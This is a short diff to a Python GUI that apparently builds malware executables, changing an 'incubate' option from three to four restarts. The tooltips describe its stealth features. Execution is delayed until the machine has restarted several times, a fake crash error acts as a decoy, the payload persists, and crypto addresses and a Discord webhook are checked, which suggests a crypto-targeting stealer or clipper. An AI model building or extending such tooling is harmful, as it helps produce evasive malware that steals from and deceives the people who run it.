@@ -541,7 +541,7 @@ class buildgui:
 
         """going to just use global here on"""
         global incubate_checkbox, false_error_checkbox
-        incubate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="incubate (3 restarts)", onvalue="on", offvalue="off")
+        incubate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="incubate (4 restarts)", onvalue="on", offvalue="off")
         incubate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
         false_error_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="false error", onvalue="on", offvalue="off")
         false_error_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
@@ -556,7 +556,7 @@ class buildgui:
         CTkToolTip.CTkToolTip(widget=add_icon_btn, message="add icon: sets a custom icon to the .exe - defult is the normal .exe icon. if icons not showing press the fix icons button", wraplength=300)
         CTkToolTip.CTkToolTip(widget=exit, message="exit: exits program", wraplength=300)
         CTkToolTip.CTkToolTip(widget=check_valid_btn, message="check valid: checks validity of crypto addresses and discord webhook", wraplength=300)
-        CTkToolTip.CTkToolTip(widget=incubate_checkbox, message="incubate: if enabled the code will not run until the computer is restarted 3 times, increases stealth, IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=incubate_checkbox, message="incubate: if enabled the code will not run until the computer is restarted 4 times, increases stealth, IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
         CTkToolTip.CTkToolTip(widget=false_error_checkbox, message="false error: if enabled the code will throw a false error to make it look like the code has crashed when it really is just a decoy (wont be installed in the peristant file). IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
         
     def main():
